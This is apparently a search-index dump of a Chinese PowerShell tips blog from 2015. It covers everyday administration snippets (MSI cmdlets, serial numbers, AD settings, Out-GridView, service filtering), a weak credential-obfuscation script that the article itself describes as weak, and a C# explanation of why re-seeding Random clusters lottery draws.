MSI Cmdlet Get-MSITable MSI Cmdlet Install-MSIPatch MSI Cmdlet Install-MSIProduct MSI Cmdlet Measure-MSIProduct MSI Cmdlet Remove-MSILoggingPolicy MSI Cmdlet Remove-MSISource MSI Cmdlet Repair-MSIProduct MSI Cmdlet Set-MSILoggingPolicy MSI Cmdlet Test-MSIProduct MSI Cmdlet Uninstall-MSIPatch MSI Cmdlet Uninstall-MSIProduct MSI","link":"/2015/01/26/cmdlets-to-manage-msi-packages/"},{"title":"PowerShell 技能连载 - 在线检测 DELL 保修","text":"适用于 PowerShell 2.0 及以上版本 如果您拥有一台 DELL 电脑，您可以通过 Web Service 提交电脑的序列号得到授权信息： $serial = '36GPL41' $service = New-WebServiceProxy -Uri http://143.166.84.118/services/assetservice.asmx?WSDL $guid = [Guid]::NewGuid() $info = $service.GetAssetInformation($guid,'warrantycheck',$serial) $info.Entitlements 结果可能看起来如下： $info.Entitlements ServiceLevelCode : TS ServiceLevelDescription : P, ProSupport Provider : DELL StartDate : 23.03.2004 00:00:00 EndDate : 23.03.2007 00:00:00 DaysLeft : 0 EntitlementType : Expired ServiceLevelCode : ND ServiceLevelDescription : C, NBD ONSITE Provider : UNY StartDate : 23.03.2005 00:00:00 EndDate : 23.03.2007 00:00:00 DaysLeft : 0 EntitlementType : Expired ServiceLevelCode : ND ServiceLevelDescription : C, NBD ONSITE Provider : UNY StartDate : 23.03.2004 00:00:00 EndDate : 24.03.2005 00:00:00 DaysLeft : 0 EntitlementType : Expired 这些从 Web Service 返回的信息还包括了其它有用的信息，例如计算机的系统类型： PS&gt; $info.AssetHeaderData ServiceTag : 36GPL41 SystemID : PLX_PNT_CEL_GX270 Buid : 11 Region : Americas SystemType : OptiPlex SystemModel : GX270 SystemShipDate : 23.03.2004 07:00:00","link":"/2015/01/27/checking-dell-warranty-online/"},{"title":"PowerShell 技能连载 - 获取计算机序列号","text":"适用于 PowerShell 所有版本 在前一个技巧里我们演示了如何通过 DELL 的序列号在线检查保修状态。其它厂家也会提供类似的服务。 这段代码可以读取序列号： $ComputerName = $env:COMPUTERNAME $serial = (Get-WmiObject -ComputerName $ComputerName -Class Win32_BIOS).SerialNumber &quot;Your computer serial is $serial&quot;","link":"/2015/01/28/getting-computer-serial-number/"},{"title":"PowerShell 技能连载 - 复制命令行历史","text":"适用于 PowerShell 所有版本 要将 PowerShell 会话中键入过的所有 PowerShell 命令保存下来，请试试这行代码： (Get-History).CommandLine | clip.exe 它将所有的命令拷贝至剪贴板。然后您就可以将它们粘贴到 PowerShell ISE 并保存为文件。","link":"/2015/01/29/copying-command-line-history/"},{"title":"PowerShell 技能连载 - 自动展开和内存消耗","text":"适用于 PowerShell 3.0 及以上版本 在 PowerShell 3.0 中，增加了一个称为“自动回滚”的特性。通过这个特性，您可以这样书写代码： (Get-ChildItem -Path $env:windir\\system32 -Filter *.dll).VersionInfo 这行代码查找 System32 子文件夹下的所有 DLL 文件并且对它们进行迭代，对每个文件返回其 VersionInfo 属性（实际上是 DLL 版本）。在使用自动展开功能之前，您需要手工编写循环语句： Get-ChildItem -Path $env:windir\\system32 -Filter *.dll | ForEach-Object { $_.VersionInfo } 当您运行以上两段代码时，它们返回完全相同的结果。然而，您将立刻发现自动展开特性所带来的代价：它消耗了更多的时间才返回结果。第一行结果出来时可能要消耗 10 秒之多的时间，而“传统”的方法几乎是连续地返回信息。 总体消耗的时间是差不多的。实际上，自动展开特性等价的代码如下： $data = Get-ChildItem -Path $env:windir\\system32 -Filter *.dll Foreach ($element in $data) { $element.VersionInfo } 自动展开代码更直观，更容易书写手写循环兼容性更好，更快输出结果。","link":"/2015/01/30/automatic-unrolling-and-memory-consumption/"},{"title":"个人管理","text":"网站幸福进化俱乐部活动论坛活页DIY会所","link":"/2015/02/02/Personal-Management/"},{"title":"PowerShell 技能连载 - 凭据混淆器","text":"适用于 PowerShell ISE 3.0 及以上版本 虽然一般不建议将密码硬编码在脚本里，但有些情况下已经这么做了。相比于硬编码明文密码，一个最基本的改进是将密码混淆。密码混淆是一种弱的保护方式，但它能确保非掌握 PowerShell 知识的人员轻易地得到密码。 这是段小脚本会询问用户名和密码，然后生成一段混淆脚本来产生凭据对象。 当您运行下面这段脚本生成的脚本，在 $cred 变量将会保存一个包含用户名和密码的凭据对象，它可以用于任何带 -Credential 参数的 cmdlet。 $cred = Get-Credential -Message 'Enter Domain\\Username and Password' $pwd = $cred.Password $user = $cred.UserName $key = 1..32 | ForEach-Object { Get-Random -Maximum 256 } $pwdencrypted = $pwd | ConvertFrom-SecureString -Key $key $private:ofs = ' ' $generatedScript = @() $generatedScript += '$password = ''{0}''' -f $pwdencrypted $generatedScript += '$key = ''{0}''' -f &quot;$key&quot; $generatedScript += '$passwordSecure = ConvertTo-SecureString -String $password -Key ([Byte[]]$key.Split('' ''))' $generatedScript += '$cred = New-Object system.Management.Automation.PSCredential(''{0}'', $passwordSecure)' -f $user $generatedScript += '$cred' $file = $psise.CurrentPowerShellTab.Files.Add() $file.Editor.Text = $generatedScript | Out-String $file.Editor.SetCaretPosition(1,1) 自动生成的密码脚本看起来类似这样： $password = '76492d1116743f0423413b16050a5345MgB8AHMAUQA3AFAAVwB0AGkAUQBUAC8AdwBqADYAUABVAFYAUwB4AEYAYgB4AFEAPQA9AHwAZgA0ADgAOQA4AGYANwA0AGEAMAA0ADUANwA5ADkAMwA5ADkAMwA1ADUANQA0AGYANwA5AGQANwBkAGYAOQBmAGEAYQA3ADMAYgBkADIAOQA3AGMAYQBmADUAMgA3ADEANwA3AGEAYgBmADAAYgA1AGYAYwAyADYAYgAzADkAOAA=' $key = '187 98 34 82 148 52 13 86 246 2 130 197 217 97 147 98 75 197 149 246 74 35 27 7 211 15 131 93 182 231 171 3' $passwordSecure = ConvertTo-SecureString -String $password -Key ([Byte[]]$key.Split(' ')) $cred = New-Object system.Management.Automation.PSCredential('mickey\\mouse', $passwordSecure) $cred","link":"/2015/02/02/credential-obfuscator/"},{"title":"PowerShell 技能连载 - 管理终端服务设置","text":"_需要 ActiveDirectory 模块 有些时候您也许希望在一个 AD 账户中直接存取终端服务相关的属性。以下是一些演示如何实现该功能的示例代码： $Identity = 'SomeUserName' $distinguishedName = (Get-ADUser -Identity $Identity -Properties distinguishedName).distinguishedName $ADUser = [ADSI]&quot;LDAP://$distinguishedName&quot; $TSProfilePath = $ADUser.psbase.InvokeGet('terminalservicesprofilepath') $TSHomeDir = $ADUser.psbase.InvokeGet('TerminalServicesHomeDirectory') $TSHomeDrive = $ADUser.psbase.InvokeGet('TerminalServicesHomeDrive') $TSAllowLogOn = $ADUser.psbase.InvokeGet('allowLogon')","link":"/2015/02/03/managing-terminal-service-settings/"},{"title":"PowerShell 技能连载 - 记录拒绝存取的文件夹","text":"适用于 PowerShell 所有版本 当您用 Get-ChildItem 浏览文件系统的时候，您可能偶尔会碰到没有查看权限的文件夹。如果您希望将抛出次异常的所有文件夹都记录下来，请试试这个方法： $result = Get-ChildItem -Path c:\\Windows -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue -ErrorVariable abcd Write-Warning 'Unable to access these folders:' Write-Warning ($abcd.TargetObject -join &quot;`r`n&quot;) 这个技巧是隐藏所有错误提示（-ErrorAction SilentlyContinue）但将错误都保存到一个变量中（-ErrorVariable abce）。","link":"/2015/02/04/logging-folders-with-access-denied-errors/"},{"title":"PowerShell 技能连载 - 使用打开文件夹对话框","text":"适用于 PowerShell 所有版本 为了在您的脚本中输入一些东西，以下是一个简单的打开“打开文件”对话框并让用户选择一个文件的函数。 function Show-OpenFileDialog { param ($Title = 'Pick a File', $Filter = 'All|*.*|PowerShell|*.ps1') $type = 'Microsoft.Win32.OpenFileDialog' $dialog = New-Object -TypeName $type $dialog.Title = $Title $dialog.Filter = $Filter if ($dialog.ShowDialog() -eq $true) { $dialog.FileName } else { Write-Warning 'Cancelled' } } 如您所见，您可以控制该对话框的标题栏和显示的文件类型。","link":"/2015/02/05/use-open-file-dialog/"},{"title":"PowerShell 技能连载 - 为必须的参数弹出一个对话框","text":"适用于 PowerShell 所有版本 通常，但您将一个参数定义为必选的，并且用户没有传入对应的实参，PowerShell 能够处理好这种情况并提示用户输入这个值： function Get-Something { param ( [Parameter(Mandatory = $true)] $Path ) &quot;You entered $Path.&quot; } 结果类似这样（您无法控制提示信息）： PS&gt; Get-Something -Path test You entered test. PS&gt; Get-Something Cmdlet Get-Something at command pipeline position 1 Supply values for the following parameters: Path: test You entered test. PS&gt; 但是您是否知道还可以通过这种方式获取一个必选参数？ function Get-Something { param ( $Path = $(Read-Host 'Please, enter a Path value') ) &quot;You entered $Path.&quot; } 这种方法将控制权交给您，以下是它看起来的样子： PS&gt; Get-Something -Path test You entered test. PS&gt; Get-Something Please, enter a Path value: test You entered test. PS&gt;","link":"/2015/02/06/mandatory-parameters-with-a-dialog/"},{"title":"如何用 PowerShell 撰写心灵鸡汤","text":"关于励志段子微信上传着一个励志段子，大意是： 如果26个英文字母 A B C D EF G H I J K L M N O P Q R S T U V W X Y Z 分别等于:1 2 3 4 5 6 7 8 9 10 11 12 13 14 1516 17 18 19 20 21 22 23 24 25 26。那么： Knowledge (知识)： K+N+O+W+L+E+D+G+E＝ 11+14+15+23+12+5+4+7+5=96% Workhard (努力工作）：W+O+R+K+H+A+R+D＝ 23+15+18+11+8+1+18+4 =98% Luck（好运） L+U+C+K＝12+21+3+11=47% Love（爱情） L+O+V+E＝12+15+22+5=54% Money（金钱） M+O+N+E+Y=13+15+14+5+25=72% Leadership（领导能力）L+E+A+D+E+R+S+H+I+P=12+5+1+4+5+18+19+9+16=89% ATTITUDE（心态）A+T+T+I+T+U+D+E＝1+20+20+9+20+21+4+5=100% 于是得出结论：用什么样的态度去看待人生，就会得到什么样的人生。 分析这样的心灵鸡汤是怎样来的呢？我们用 PowerShell 脚本来琢磨一下。 12345678function Get-Weight([string]$word) { $word = $word.ToLower() #Write-Host ([System.Text.Encoding]::ASCII.GetBytes($word) | # ForEach-Object { $_ - 96 }) return ([System.Text.Encoding]::ASCII.GetBytes($word) | ForEach-Object { $_ - 96 } | Measure-Object -Sum).Sum} 这个函数可以对任意字符串求值，例如以下测试代码将返回 6(abc = 1+2+3)： 1Get-Weight 'abc' 现在可以测试一下段子里用到的几个单词，并对结果进行排序： 12'Knowledge', 'Workhard', 'Luck', 'Love', 'Money', 'Leadership', 'ATTITUDE' | Sort-Object -Property @{Expression = { Get-Weight $_ }} 结果符合预期： Luck Love Money Knowledge Leadership Workhard ATTITUDE 如何撰写鸡汤以上实现了输入任意字符串数组，对它们进行求值和排序。但是如何选出这些单词呢？我们可以找一篇长文，例如从麻省理工找到莎士比亚的《哈姆雷特》全文，将它输进去拆解成单词试试： 12345$resp = Invoke-WebRequest 'http://shakespeare.mit.edu/hamlet/full.html'$fullText = $resp.ParsedHtml.documentElement.innerText$words = [regex]::Matches($fullText, '\\b\\w+\\b') | ForEach-Object { $_.Value } | Sort-Object -Unique 这样几行代码，就可以将《哈姆雷特》全文的所有单词挑出来进行排序，并将结果保存在 $words 变量中。 最后套用我们上面写好的函数即可实现对所有单词求值排序： 12345$words | Sort-Object -Property @{Expression = { Get-Weight $_ }} | ForEach-Object { &quot;$_`t$(Get-Weight $_)&quot; } 结果大概是这样： word weight a 1 c 3 d 4 e 5 bad 7 be 7 I 9 … … letters 99 firmament 99 temperance 100 Writing 100 … … prosperously 199 unproportioned 200 有了这个长长的表格之后，撰写鸡汤就容易多了。只要按顺序挑出一些单词，设计一下台词即可。 完整的代码如下： function Get-Weight([string]$word) { $word = $word.ToLower() #Write-Host ([System.Text.Encoding]::ASCII.GetBytes($word) | # ForEach-Object { $_ - 96 }) return ([System.Text.Encoding]::ASCII.GetBytes($word) | ForEach-Object { $_ - 96 } | Measure-Object -Sum).Sum } # Test # Get-Weight 'abc' if (!$resp) { $resp = Invoke-WebRequest 'http://shakespeare.mit.edu/hamlet/full.html' } $fullText = $resp.ParsedHtml.documentElement.innerText $words = [regex]::Matches($fullText, '\\b\\w+\\b') | ForEach-Object { $_.Value } | Sort-Object -Unique # The following code will procuce output: # Luck # Love # Money # Knowledge # Leadership # Workhard # ATTITUDE 'Knowledge', 'Workhard', 'Luck', 'Love', 'Money', 'Leadership', 'ATTITUDE' | Sort-Object -Property @{Expression = { Get-Weight $_ }} $words | Sort-Object -Property @{Expression = { Get-Weight $_ }} | ForEach-Object { &quot;$_`t$(Get-Weight $_)&quot; } 后记完整的代码可以在这里下载。鸡汤的原文请参见《是哪位高人琢磨出的这条微信，太牛了》。顺便发现了原文中的一个计算 bug——Leadership（领导能力）应是L+E+A+D+E+R+S+H+I+P=12+5+1+4+5+18+19+8+9+16=97%，而不是 89%。 怎么样，有没有一点理工男秒杀心灵鸡汤的味道？","link":"/2015/02/08/How-to-Encourage/"},{"title":"PowerShell 技能连载 - 有用的静态 .NET 方法","text":"适用于 PowerShell 所有版本 PowerShell 可以调用 .NET 类型的静态方法。以下是一些很好用的单行代码： [Math]::Round(7.9) [Convert]::ToString(576255753217, 8) [Guid]::NewGuid() [Net.Dns]::GetHostByName('schulung12') [IO.Path]::GetExtension('c:\\test.txt') [IO.Path]::ChangeExtension('c:\\test.txt', 'bak') 要查看更多的用法，请删除类型（方括号中的文字）后的代码，然后键入两个冒号。PowerShell ISE 将会自动弹出一个快捷菜单列出该类型可用的方法。在 PowerShell 控制台中，只需要按下 TAB 键即可得到自动完成的建议。 您也可以将一个类型通过管道输出到 Get-Member 命令： PS&gt; [Math] | Get-Member -MemberType *Method -Static TypeName: System.Math Name MemberType Definition ---- ---------- ---------- Abs Method static sbyte Abs(sbyte value), static int16 Abs(int16 value), static int Abs(int value), sta... Acos Method static double Acos(double d) Asin Method static double Asin(double d) Atan Method static double Atan(double d) Atan2 Method static double Atan2(double y, double x) BigMul Method static long BigMul(int a, int b) Ceiling Method static decimal Ceiling(decimal d), static double Ceiling(double a) Cos Method static double Cos(double d) Cosh Method static double Cosh(double value DivRem Method static int DivRem(int a, int b, [ref] int result), static long DivRem(long a, long b, [ref] ... Equals Method static bool Equals(System.Object objA, System.Object objB) Exp Method static double Exp(double d) Floor Method static decimal Floor(decimal d), static double Floor(double d) IEEERemainder Method static double IEEERemainder(double x, double y) Log Method static double Log(double d), static double Log(double a, double newBase) Log10 Method static double Log10(double d) Max Method static sbyte Max(sbyte val1, sbyte val2), static byte Max(byte val1, byte val2), static int1... Min Method static sbyte Min(sbyte val1, sbyte val2), static byte Min(byte val1, byte val2), static int1... Pow Method static double Pow(double x, double y) ReferenceEquals Method static bool ReferenceEquals(System.Object objA, System.Object objB) Round Method static double Round(double a), static double Round(double value, int digits), static double ... Sign Method static int Sign(sbyte value), static int Sign(int16 value), static int Sign(int value), stat... Sin Method static double Sin(double a) Sinh Method static double Sinh(double value) Sqrt Method static double Sqrt(double d) Tan Method static double Tan(double a) Tanh Method static double Tanh(double value) Truncate Method static decimal Truncate(decimal d), static double Truncate(double d) 要查看某个方法的所有重载的签名，请去掉圆括号： PS&gt; Get-Something -Path test You entered test. PS&gt; [Math]::Round OverloadDefinitions ------------------- static double Round(double a static double Round(double value, int digits) static double Round(double value, System.MidpointRounding mode) static double Round(double value, int digits, System.MidpointRounding mode static decimal Round(decimal d static decimal Round(decimal d, int decimals) static decimal Round(decimal d, System.MidpointRounding mode) static decimal Round(decimal d, int decimals, System.MidpointRounding mode)","link":"/2015/02/09/useful-static-net-methods/"},{"title":"PowerShell 技能连载 - 查找 AD 复制失败信息","text":"适用于 Windows 8.1、Server 2012 R2 在 Windows 8.1 和 Server 2012 R2 中，查看 Active Directory 复制失败的信息变得更简单了。Get-ADReplicationFailure 这个新的 cmdlet 将会输出最近的复制失败信息。用它来检查一个特定的域控制器的方法： PS&gt; Get-ADReplicationFailure dc1.test.com 或者检查整个站点： PS&gt; Get-ADReplicationFailure -Scope Site -Target Hannover 该 cmdlet 是随 Windows 8.1 和 Server 2012 R2 发布的 ActiveDirectory 模块的一部分。在您使用它之前，请确保您在控制面板/软件/启用或关闭 Windows 功能中启用了它。它是“远程服务器管理工具 (RSAT)”的一部分。如果您的 Windows 8.1 没有预装 RSAT，您可以从这里下载它：http://www.microsoft.com/de-de/download/details.aspx?id=39296。 要查看该模块提供的其它 cmdlet，请试试这行代码： PS&gt; Get-Command -Module ActiveDirectory CommandType Name ModuleName ----------- ---- ---------- Cmdlet Add-ADCentralAccessPolicyMember ActiveDir... Cmdlet Add-ADComputerServiceAccount ActiveDir... Cmdlet Add-ADDomainControllerPasswordReplicationPolicy ActiveDir... Cmdlet Add-ADFineGrainedPasswordPolicySubject ActiveDir... (...) 请注意针对 Windows 8.1/Server 2012 R2 的 RSAT提供了一些额外的 cmdlet，这些 cmdlet 在针对 Windows 早期版本的 RSAT 中并没有提供。","link":"/2015/02/10/find-ad-replication-failures/"},{"title":"PowerShell 技能连载 - 将 PowerShell 工具增加到 Windows 8 启动屏幕","text":"适用于 Windows 8/Windows 8.1 您可能注意到了 Windows 8 启动屏幕默认没有 PowerShell ISE 之类的 PowerShell 工具。当您转到开始屏幕并且输入 “ISE” 时，搜不到任何结果。 要改变这种情况，请确保开始屏幕显示了“管理员工具”。在开始屏幕上，将鼠标移动到最右侧，直到出来一个菜单。然后，点击“设置”，然后点击“磁贴”。 现在打开“显示管理员工具”的滑块。 当您做完这步，Windows 8 启动屏幕将会显示 PowerShell 工具，并且当您键入 “ISE” 时内置的搜索工具将会显示 PowerShell ISE。 在搜索结果中右键单击 “Windows PowerShell ISE” 可以看到额外的选项，并且可以将编辑器钉在任务栏上。","link":"/2015/02/11/adding-powershell-tools-to-windows/"},{"title":"PowerShell 技能连载 - 获得一个干净的 PowerShell 环境","text":"适用于 PowerShell 3.0 及以上版本 当您在 PowerShell ISE 中开发 PowerShell 脚本时，您可能做了很多更改和修订，并且测试运行了脚本。 这将“污染”您的环境：所有在脚本作用域内定义的变量仍然是定义过的状态，所以后续的测试不再是在一个干净的缺省环境中执行。 要确保一个脚本是在一个完全干净的测试环境中执行，您当然可以重启 PowerShell ISE。一个更便捷的方法是打开一个新的 PowerShell 选项卡：在 PowerShell ISE 中，选择文件/新建 PowerShell 选项卡。 这个操作将在脚本面板中新建一个选项卡。该选项卡代表一个全新的 PowerShell 宿主。您可以在这个新选项卡中加载您的测试脚本，并且在那儿进行测试。当测试完毕后，只需要点击关闭选项卡，即可从内存中消除掉它的所有相关内容。 请注意您可以在多个标签页中连续打开同一个脚本。当您这么操作时，ISE 会警告您该脚本已在另一个选项卡中打开了。当您编辑该脚本时，所有的编辑操作都会作用到所有打开该脚本的选项卡实例。","link":"/2015/02/12/getting-a-clean-powershell-environment/"},{"title":"PowerShell 技能连载 - 导出 Out-GridView 的内容","text":"适用于 PowerShell 3.0 及以上版本 Out-GridView 是一个非常有用的将结果输出到一个外部窗口的 cmdlet。和输出到控制台不同，Out-GridView 不会将文本截断。不过它好像没有很明显的方法将信息拷贝出来。 试试这种方法！首先，生成一些数据，然后将它用管道输出到网格视图窗口： PS&gt; Get-Process | Out-GridView 接下来，可以用顶部的文本框过滤结果，或单击列头来排序。 最后，要将信息导出到别的地方，例如要将进程列表导出到一个 Word 文档中，只需要在结果的任意位置单击，然后按下 CTRL+A 全选，然后按 CTRL+C 将选中的内容复制到剪贴板。 这样，您可以简单地将复制的数据粘贴到您要的应用程序中。不幸的是，列头并不会被复制到剪贴板中。 请注意 Out-GridView 有个内置的限制：它只能显示最多 30 个属性（列）。所以如果您的输入数据有更多的属性，您可能需要限制只显示您确实需要的属性： PS&gt; Get-Process | Select-Object -Property Name, Company, StartTime | Out-GridView","link":"/2015/02/13/exporting-out-gridview-content/"},{"title":"随机抽奖中的粘连现象","text":"现象公司年会中的抽奖环节，是用一个计算机程序来随机抽取中奖姓名，嘉宾喊一声停，屏幕上就出现五个姓名。不过每抽取一次，大屏幕上显示的姓名往往是按部门粘连在一块的。也就是同一个部门连续出现 3-4 个中奖人。 重现这种现象是怎么产生的呢？从程序上，可以想象到一种可能性。我们用 C# 写一个随机数生成器，并假设录入数据的时候，是按部门录入的： 1234567891011121314151617181920212223242526internal class Generator{ private readonly IList&lt;string&gt; candidateList; private Random random = new Random(); internal Generator(string[] candidates) { candidateList = new List&lt;string&gt;(candidates); } internal string Pick() { var random = new Random(); // 会导致粘连 //var random = this.random; // 不会粘连 int index = random.Next(candidateList.Count); Debug.Write(index + &quot;, &quot;); Thread.Sleep(5); // 延时，模拟计算机性能差的情况。 // 设为 5 时，有很多“粘连”的数据。 // 设为 15 时，“粘连”现象就消失了！ string choosen = candidateList[index]; candidateList.Remove(choosen); return choosen; }} 在 Pick() 方法中，采用 var random = new Random();，则生成的中奖名单如下： 从 Debug 窗口中可以观察到，每一轮（5 个）抽取的序号中实际上有许多是重复的或者是相邻的。而这一轮和下一轮之间的序号并不相邻。 3, 3, 3, 3, 3, 35, 35, 35, 34, 34, 14, 14, 13, 13, 13, 16, 15, 15, 15, 15, 60, 59, 58, 57, 57, 42, 41, 41, 40, 40, 8, 8, 7, 7, 7, 32, 32, 31, 31, 30, 12, 12, 11, 11, 11, 而且，调节 Thread.Sleep(x); 中的延时值，模拟计算机性能的快慢，可以改变结果粘连的程度！当延时小于 5 毫秒时，粘连现象十分明显当延时大于 15 时，粘连现象基本消失。 消除粘连计算机性能是不可控制的，那么应当如何产生正确的随机数呢？正确的做法是，在一系列随机数生成的过程中，应该自始至终用同一个随机数发生器，而不是每生成一个随机数就临时创建一个随机数发生器。 所以在 Pick() 方法里 var random = new Random(); 的写法是不正确的。应该采用生存周期更长的 var random = this.random; 写法。代码修改后粘连现象消失了： 结论造成粘连现象的本质原因如下： 随机数的生成是从种子值开始。 如果反复使用同一个种子，就会生成相同的数字系列。 产生不同序列的一种方法是使种子值与时间相关，从而对于 Random 的每个新实例，都会产生不同的系列。 默认情况下，Random 类的无参数构造函数使用系统时钟生成其种子值，而参数化构造函数可根据当前时间的计时周期数采用 Int32 值。 但是，因为时钟的分辨率有限，所以，如果使用无参数构造函数连续创建不同的 Random 对象，就会创建生成相同随机数序列的随机数生成器。 在一轮中，每次抽号抽取的是相同的随机数序列的第一个元素，所以结果很有可能是相同的。由于中奖的号码从列表中移走，所以很可能连续抽到相邻部门的姓名。 注意，虽然结果有些不符合常理，但是对于个人来说，中奖概率还是均等的。 完整的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172using System;using System.Collections.Generic;using System.Diagnostics;using System.Text;using System.Threading;namespace Lottery{ internal class Generator { private readonly IList&lt;string&gt; candidateList; private Random random = new Random(); internal Generator(string[] candidates) { candidateList = new List&lt;string&gt;(candidates); } internal string Pick() { var random = new Random(); // 会导致粘连 //var random = this.random; // 不会粘连 int index = random.Next(candidateList.Count); Debug.Write(index + &quot;, &quot;); Thread.Sleep(5); // 延时，模拟电脑性能差的情况。 // 设为 5 时，有很多“粘连”的数据。 // 设为 15 时，“粘连”现象就消失了！ string choosen = candidateList[index]; candidateList.Remove(choosen); return choosen; } } internal class Program { private static void Main(string[] args) { string[] candidates = { &quot;公司领导-宋江&quot;, &quot;公司领导-卢俊义&quot;, &quot;公司领导-吴用&quot;, &quot;公司领导-公孙胜&quot;, &quot;公司领导-关胜&quot;, &quot;公司领导-林冲&quot;, &quot;公司领导-秦明&quot;, &quot;公司领导-呼延灼&quot;, &quot;市场部-花荣&quot;, &quot;市场部-柴进&quot;, &quot;市场部-李应&quot;, &quot;市场部-朱仝&quot;, &quot;市场部-鲁智深&quot;, &quot;测试中心-武松&quot;, &quot;测试中心-董平&quot;, &quot;测试中心-张清&quot;, &quot;测试中心-杨志&quot;, &quot;测试中心-徐宁&quot;, &quot;测试中心-索超&quot;, &quot;测试中心-戴宗&quot;, &quot;测试中心-刘唐&quot;, &quot;财务部-李逵&quot;, &quot;财务部-史进&quot;, &quot;财务部-穆弘&quot;, &quot;财务部-雷横&quot;, &quot;财务部-李俊&quot;, &quot;财务部-阮小二&quot;, &quot;财务部-张横&quot;, &quot;品质管理部-阮小五&quot;, &quot;品质管理部-张顺&quot;, &quot;品质管理部-阮小七&quot;, &quot;品质管理部-杨雄&quot;, &quot;品质管理部-石秀&quot;, &quot;品质管理部-解珍&quot;, &quot;人力资源部-解宝&quot;, &quot;人力资源部-燕青&quot;, &quot;人力资源部-朱武&quot;, &quot;人力资源部-黄信&quot;, &quot;人力资源部-孙立&quot;, &quot;人力资源部-宣赞&quot;, &quot;人力资源部-郝思文&quot;, &quot;系统支持部-韩滔&quot;, &quot;系统支持部-彭玘&quot;, &quot;系统支持部-单廷珪&quot;, &quot;系统支持部-魏定国&quot;, &quot;系统支持部-萧让&quot;, &quot;信息中心-裴宣&quot;, &quot;信息中心-欧鹏&quot;, &quot;信息中心-邓飞&quot;, &quot;信息中心-燕顺&quot;, &quot;信息中心-杨林&quot;, &quot;信息中心-凌振&quot;, &quot;信息中心-蒋敬&quot;, &quot;研发一部-吕方&quot;, &quot;研发一部-郭盛&quot;, &quot;研发一部-安道全&quot;, &quot;研发一部-皇甫端&quot;, &quot;研发一部-王英&quot;, &quot;研发一部-扈三娘&quot;, &quot;研发一部-鲍旭&quot;, &quot;研发一部-樊瑞&quot;, &quot;研发二部-孔明&quot;, &quot;研发二部-孔亮&quot;, &quot;研发二部-项充&quot;, &quot;研发二部-李衮&quot;, &quot;研发二部-金大坚&quot;, &quot;研发二部-马麟&quot;, &quot;研发二部-童威&quot;, &quot;研发三部-童猛&quot;, &quot;研发三部-孟康&quot;, &quot;研发三部-侯健&quot;, &quot;研发三部-陈达&quot;, &quot;研发三部-杨春&quot;, &quot;研发三部-郑天寿&quot;, &quot;研发三部-陶宗旺&quot;, &quot;研发三部-宋清&quot;, &quot;研发三部-乐和&quot;, &quot;研发三部-龚旺&quot;, &quot;研发三部-丁得孙&quot;, &quot;研发四部-穆春&quot;, &quot;研发四部-曹正&quot;, &quot;研发四部-宋万&quot;, &quot;研发四部-杜迁&quot;, &quot;研发四部-薛永&quot;, &quot;研发四部-施恩&quot;, &quot;研发四部-李忠&quot;, &quot;研发四部-周通&quot;, &quot;研发四部-汤隆&quot;, &quot;研发四部-杜兴&quot;, &quot;研发四部-邹渊&quot;, &quot;研发五部-邹润&quot;, &quot;研发五部-朱贵&quot;, &quot;研发五部-朱富&quot;, &quot;研发五部-蔡福&quot;, &quot;研发五部-蔡庆&quot;, &quot;研发五部-李立&quot;, &quot;研发五部-李云&quot;, &quot;研发五部-焦挺&quot;, &quot;研发六部-石勇&quot;, &quot;研发六部-孙新&quot;, &quot;研发六部-顾大嫂&quot;, &quot;研发六部-张青&quot;, &quot;研发六部-孙二娘&quot;, &quot;研发六部-王定六&quot;, &quot;研发六部-郁保四&quot;, &quot;研发六部-白胜&quot;, &quot;研发六部-时迁&quot;, &quot;研发六部-段景住&quot; }; var generator = new Generator(candidates); Console.WindowWidth = 100; while (Console.ReadKey().Key != ConsoleKey.Escape) { var sb = new StringBuilder(); for (int i = 0; i &lt; 5; i++) { var choosen = generator.Pick(); sb.Append(choosen); sb.Append('\\t'); } Console.WriteLine(sb.ToString().TrimEnd()); } } }} 您也可以在这里下载完整的代码。","link":"/2015/02/14/Concatenation-in-Random/"},{"title":"PowerShell 技能连载 - 查找所有可停止的服务","text":"适用于 PowerShell 3.0 及以上版本 Get-Service 可以列出您计算机上所有已安装的服务。不过它没有可以选择仅包含运行或停止的服务的参数。 用一个简单的 Where-Object 从句，您可以实现这个目的。最常见的是，您会见到类似如下的用法： PS&gt; Get-Service | Where-Object Status -eq Running 基本上，Where-Object 可以指定对象拥有的任意属性并且允许您定义需要的条件。 如果您打算获得一个可停止的服务的列表，那么上述代码不能达到您所要的目的。一些服务可能正在运行但是不能被停止。稍微调整一下过滤条件，您就可以达到所要的目的了。这段代码列出所有运行中并且可以停止的服务： PS&gt; Get-Service | Where-Object CanStop 并且这种写法缩短了代码量：由于 “CanStop“ 属性本身是个布尔值（true 或 false），所以无需使用比较运算符。 要查看这个列表的补集，即所有不可停止的服务，可使用比较运算符： PS&gt; Get-Service | Where-Object CanStop -eq $false 请注意用 Where-Object 的简化语法，您无法取得相反的结果。以下代码并不会生效： PS&gt; Get-Service | Where-Object !CanStop PS&gt; Get-Service | Where-Object -not CanStop 要使用这些条件，或者要合并比较条件，请使用完整语法： PS&gt; Get-Service | Where-Object { !$_.CanStop -and $_.Status -eq 'Running' }","link":"/2015/02/16/finding-all-stoppable-services/"},{"title":"PowerShell 技能连载 - Out-GridView：通用对话框","text":"适用于 PowerShell 3.0 及以上版本 默认情况下，Out-GridView 是一条单行道：您可以将数据用管道输出到该命令，将结果显示在一个网格视图窗口中，但是您无法将数据再往下传递。 当您添加了 -PassThru 开关参数时，情况就变了。这时 Out-GridView 的右下角显示了两个新按钮：“确定”和“取消”。它将自己变为一个通用的对话框。 试试这行代码： PS&gt; Get-Service | Where-Object CanStop | Out-GridView -Title 'Stoppable Services' -PassThru 这将打开一个标题为 “Stoppable Services” 的网格视图窗口，并列出所有可停止的服务（您可能还需要管理员权限才可以停止它们）。 您现在可以选择一个或多个项目（按住 CTRL 键多选），然后点击网格视图窗口右下角的“确定”按钮。 如您所见，返回了选中的对象。 要将这行代码变为一个有用的工具，您可以将 Out-GridView 的结果输出到 cmdlet，来执行具体的操作。这行代码将试图停止所有选中的服务： PS&gt; Get-Service | Where-Object CanStop | Out-GridView -Title 'Stoppable Services' -PassThru | Stop-Service -WhatIf 请注意，出于安全考虑，我们对 Stop-Service 命令增加了 -WhatIf 参数，所以该 cmdlet 只会模拟停止服务。当您移除了这个参数，该行代码就不是模拟执行，而是真实停止服务了。 只需要坐下喝杯咖啡，然后思考一下它的原理：Out-GridView 接受任何类型的数据，所以您可以用它创建任何工具。例如，使用 